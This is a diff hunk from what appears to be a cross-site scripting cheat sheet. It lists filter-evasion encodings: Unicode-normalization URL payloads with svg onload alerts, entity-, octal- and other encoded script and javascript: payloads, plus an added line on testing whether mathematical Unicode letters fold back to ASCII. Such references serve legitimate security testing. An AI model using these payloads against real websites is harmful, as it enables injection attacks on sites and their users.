@@ -90,6 +90,7 @@ Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transform
 E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ <br>
 %EF%BC%9E becomes > <br>
 %EF%BC%9C becomes < <br>
+ Try Polygot to see if ASCII is returned - %F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83 after unicode is Leonishan. <br>
  Try UTF-7, UTF-8 UTF-16BE, UTF-32 encoding, Base64 encoding, Hexadecimal encoding without semicolon, Decimal HTML character, <br>
  Decimal HTML character without semicolon (<.script>alert(1)<./script> to &#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62) <br> 
  Octal encoding (javascript:prompt(1) to javascript:'\160\162\157\155\160\164\50\61\51) <br>
